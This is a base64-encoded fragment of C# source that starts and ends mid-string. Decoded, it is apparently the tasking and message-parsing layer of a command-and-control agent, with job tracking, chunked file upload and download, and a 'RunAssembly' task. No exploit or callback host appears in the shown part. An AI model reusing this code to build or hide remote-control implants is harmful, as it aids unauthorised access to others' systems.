ZpbGVfaWQgeyBnZXQ7IHNldDt9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJlc3BvbnNlU3VjY2Vzc0Zvcm1hdCA9IEAie3siInN0YXR1cyIiOiAiInswfSIiLCAiInRhc2tfaWQiIjogIiJ7MX0iIn19IjsNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJlc3BvbnNlRXJyb3JGb3JtYXQgPSBAInt7IiJzdGF0dXMiIjogIiJ7MH0iIiwgIiJ0YXNrX2lkIiI6ICIiezF9IiIsICIiZXJyb3IiIjogIiJ7Mn0iIn19IjsNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJlc3BvbnNlRG93bmxvYWRGb3JtYXQgPSBAInt7IiJzdGF0dXMiIjogIiJ7MH0iIiwgIiJ0YXNrX2lkIiI6ICIiezF9IiIsICIiZmlsZV9pZCIiOiAiInsyfSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZVN1Y2Nlc3Moc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZUVycm9yKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsICJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PFJlc3BvbnNlPiBQYXJzZVJlc3BvbnNlcyhzdHJpbmcgcmVzcG9uc2VzX2pzb24pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlc19qc29uID09ICJbXSIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzX2pzb24gPSByZXNwb25zZXNfanNvbi5SZXBsYWNlKCJbIiwgQCIiKS5SZXBsYWNlKCJdIiwgQCIiKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgTGlzdDxSZXNwb25zZT4gcmVzcG9uc2VzID0gbmV3IExpc3Q8UmVzcG9uc2U+KCk7DQogICAgICAgICAgICAgICAgc3RyaW5nW10gcmVzcG9uc2VzX3NwbGl0ID0gcmVzcG9uc2VzX2pzb24uU3BsaXQobmV3W10geyAifSwiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5SZW1vdmVFbXB0eUVudHJpZXMpOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKHN0cmluZyByZXNwb25zZSBpbiByZXNwb25zZXNfc3BsaXQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gbmV3IExpc3Q8c3RyaW5nPiB7IH07DQogICAgICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5Db250YWlucygiZXJyb3IiKSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gUmVzcG9uc2UuUGFyc2VFcnJvcihyZXNwb25zZSwgUmVzcG9uc2VFcnJvckZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMykgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UgbmV3X3Jlc3BvbnNlID0gbmV3IFJlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBwYXJzZUxpc3RbMl0NCiAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMuQWRkKG5ld19yZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAocmVzcG9uc2UuQ29udGFpbnMoImZpbGVfaWQiKSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gUmVzcG9uc2UuUGFyc2VFcnJvcihyZXNwb25zZSwgUmVzcG9uc2VEb3dubG9hZEZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMykgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UgbmV3X3Jlc3BvbnNlID0gbmV3IFJlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IHBhcnNlTGlzdFsyXQ0KICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcy5BZGQobmV3X3Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFJlc3BvbnNlLlBhcnNlU3VjY2VzcyhyZXNwb25zZSArICJ9IiwgUmVzcG9uc2VTdWNjZXNzRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0LkFkZCgiIik7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDMpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlIG5ld19yZXNwb25zZSA9IG5ldyBSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gcGFyc2VMaXN0WzJdDQogICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzLkFkZChuZXdfcmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiByZXNwb25zZXM7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgSm9iTGlzdA0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgaW50IGpvYl9jb3VudCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgTGlzdDxKb2I+IGpvYnMgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgSm9iTGlzdCgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgam9icyA9IG5ldyBMaXN0PEpvYj4oKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBKb2INCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIGludCBqb2JfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBib29sIGNvbXBsZXRlZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCBqb2Jfc3RhcnRlZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCBzdWNjZXNzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY29tbWFuZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHBhcmFtZXRlcnMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyByZXNwb25zZSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgVGhyZWFkIHRocmVhZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCB1cGxvYWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGJvb2wgZG93bmxvYWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGJvb2wgY2h1bmtpbmdfc3RhcnRlZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IHRvdGFsX2NodW5rcyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IGNodW5rX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IHdyaXRlX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGxvbmcgZmlsZV9zaXplIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgcGF0aCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgTGlzdDxzdHJpbmc+IGNodW5rcyB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBKb2IoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNodW5rcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBVcGxvYWRUYXNraW5nDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYXNzZW1ibHlfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyByZW1vdGVfcGF0aCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFVwbG9hZFRhc2tpbmdGb3JtYXQgPSBAIiIiYXNzZW1ibHlfaWQiIjogIiJ7MH0iIiwgIiJyZW1vdGVfcGF0aCIiOiAiInsxfSIiIjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFwiLCBAIiIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEuUmVwbGFjZShAIlwiLCBAIiIpKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIFVwbG9hZFRhc2tpbmcgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IFVwbG9hZFRhc2tpbmcuUGFyc2UobWVzc2FnZSwgVXBsb2FkVGFza2luZ0Zvcm1hdCk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAyKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBVcGxvYWRUYXNraW5nDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhc3NlbWJseV9pZCA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgcmVtb3RlX3BhdGggPSBwYXJzZUxpc3RbMV0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFJ1bkFzc2VtYmx5DQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYXJncyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFzc2VtYmx5X2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUnVuQXNzZW1ibHlGb3JtYXQgPSBAIiIiYXNzZW1ibHlfaWQiIjogIiJ7MH0iIiwgIiJhcmdzIiI6ICIiezF9IiIiOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXCIsIEAiIik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YS5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgUnVuQXNzZW1ibHkgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IFJ1bkFzc2VtYmx5LlBhcnNlKG1lc3NhZ2UsIFJ1bkFzc2VtYmx5Rm9ybWF0KTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDIpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFJ1bkFzc2VtYmx5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhcmdzID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICBhc3NlbWJseV9pZCA9IHBhcnNlTGlzdFswXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgVXBsb2FkDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgY2h1bmtfc2l6ZSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCBjaHVua19udW0geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmdWxsX3BhdGggeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0ID0gQCJ7eyIiYWN0aW9uIiI6IiJ7MH0iIiwiImNodW5rX3NpemUiIjp7MX0sIiJmaWxlX2lkIiI6IiJ7Mn0iIiwiImNodW5rX251bSIiOnszfSwgIiJmdWxsX3BhdGgiIjogIiJ7NH0iIiwiInRhc2tfaWQiIjoiIns1fSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oVXBsb2FkIHVwbG9hZCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgdXBsb2FkLkpzb25Gb3JtYXQsDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmFjdGlvbiksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmNodW5rX3NpemUuVG9TdHJpbmcoKSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmZpbGVfaWQpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHVwbG9hZC5jaHVua19udW0uVG9TdHJpbmcoKSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmZ1bGxfcGF0aCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLnRhc2tfaWQpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcHVibGljIGNsYXNzIFVwbG9hZFJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgdG90YWxfY2h1bmtzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgY2h1bmtfbnVtIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY2h1bmtfZGF0YSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVXBsb2FkUmVzcG9uc2VGb3JtYXQgPSBAInt7IiJhY3Rpb24iIjogIiJ7MH0iIiwgIiJ0b3RhbF9jaHVua3MiIjogezF9LCAiImNodW5rX251bSIiOiB7Mn0sICIiY2h1bmtfZGF0YSIiOiAiInszfSIiLCAiImZpbGVfaWQiIjogIiJ7NH0iIiwgIiJ0YXNrX2lkIiI6ICIiezV9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsIEAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInszfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7M30iLCAiKD8nZ3JvdXAzJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezR9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoIns0fSIsICIoPydncm91cDQnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7NX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezV9IiwgIig\/J2dyb3VwNScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YS5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMiJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMyJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDMiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDQiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXA0Il0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXA1Il0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwNSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIFVwbG9hZFJlc3BvbnNlIEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBVcGxvYWRSZXNwb25zZS5QYXJzZShtZXNzYWdlLCBVcGxvYWRSZXNwb25zZUZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDYpIHsgcmV0dXJuIG51bGw7IH0NCiA